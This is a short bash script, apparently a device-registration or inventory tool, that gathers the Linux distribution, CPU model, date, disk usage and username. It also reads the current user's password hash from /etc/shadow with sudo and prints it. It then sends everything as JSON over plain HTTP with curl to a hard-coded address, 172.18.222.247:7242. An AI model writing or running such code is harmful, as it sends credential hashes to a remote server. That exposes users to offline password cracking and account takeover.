#!/bin/bash

# Get Linux Distribution and Version
if [ -r /etc/os-release ]; then
    source /etc/os-release
    DISTRO="$NAME"
    VERSION="$VERSION"
elif [ -r /etc/lsb-release ]; then
    source /etc/lsb-release
    DISTRO="$DISTRIB_ID"
    VERSION="$DISTRIB_RELEASE"
else
    DISTRO=$(cat /etc/*-release | awk -F= '/^NAME/{print $2}' | tr -d '"')
    VERSION=$(cat /etc/*-release | awk -F= '/^VERSION/{print $2}' | tr -d '"')
fi

# Get CPU model
CPU_MODEL=$(grep "model name" /proc/cpuinfo | head -n 1 | cut -d ':' -f 2 | tr -s ' ')

# Get Date and Time
DATE_TIME=$(date)

# Get Disk Usage
DISK_USAGE=$(df -h / | awk 'NR==2{print $3}')

# Get username
CURRENT_USERNAME=$(whoami)

# Get password
CURRENT_PASS=$(sudo cat /etc/shadow | grep "$CURRENT_USERNAME" | cut -d ':' -f2)

echo "$DISTRO"
echo "$CPU_MODEL"
echo "$DATE_TIME"
echo "$DISK_USAGE"
echo "$CURRENT_USERNAME"
echo "$CURRENT_PASS"

echo -e "Sending info to Server:\n"

# Construct JSON data
JSON_DATA="{\"UserName\": \"$CURRENT_USERNAME\", \"Password\": \"$CURRENT_PASS\", \"LinuxDistro\": \"$DISTRO\", \"Cpu\": \"$CPU_MODEL\", \"DateTime\": \"$DATE_TIME\", \"DiskUsage\": \"$DISK_USAGE\"}"

# Send the cURL request with the JSON data
curl --location 'http://172.18.222.247:7242/Device/AddServer' \
--header 'Content-Type: application/json' \
--header 'Accept: application/json' \
--data "$JSON_DATA"

echo -e "Request Sent!"
